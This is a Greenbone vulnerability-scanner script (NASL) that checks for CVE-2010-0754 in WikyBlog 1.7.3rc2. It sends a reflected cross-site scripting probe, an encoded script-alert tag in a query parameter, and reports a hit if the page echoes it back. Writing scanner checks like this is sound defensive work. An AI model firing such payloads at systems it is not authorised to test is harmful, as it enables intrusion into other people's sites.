# Copyright (C) 2010 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:wikyblog:wikyblog";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100506");
  script_version("2021-09-07T05:45:38+0000");
  script_tag(name:"last_modification", value:"2021-09-07 10:21:00 +0000 (Tue, 07 Sep 2021)");
  script_tag(name:"creation_date", value:"2010-02-24 18:35:31 +0100 (Wed, 24 Feb 2010)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_cve_id("CVE-2010-0754");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("WikyBlog <= 1.7.3rc2 Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_wikyblog_http_detect.nasl");
  script_mandatory_keys("wikyblog/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"WikyBlog is prone to multiple vulnerabilities, including an
  arbitrary file upload issue, a cross-site scripting (XSS) issue, a remote file include issue and
  a session-fixation issue.");

  script_tag(name:"impact", value:"Attackers can exploit these issues to:

  - Execute arbitrary script code in the browser of an unsuspecting user in the context of the
  affected site

  - Steal cookie-based authentication credentials

  - Upload arbitrary PHP scripts and execute them in the context of the webserver

  - Compromise the application and the underlying system

  - Hijack a user's session and gain unauthorized access to the affected application");

  script_tag(name:"affected", value:"WikyBlog 1.7.3rc2 is vulnerable, other versions may also be
  affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/38386");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

vt_strings = get_vt_strings();

url = dir + "/index.php/Special/Main/Templates?cmd=copy&which=%3Cscript%3Ealert(%27" + vt_strings["lowercase"] + "%27)%3C/script%3E";
req = http_get(item: url, port: port);
buf = http_keepalive_send_recv(port:port, data:req);

if (buf =~ "^HTTP/1\.[01] 200" && egrep(pattern: "<script>alert\('" + vt_strings["lowercase"] + "'\)</script>", string: buf, icase: TRUE)) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);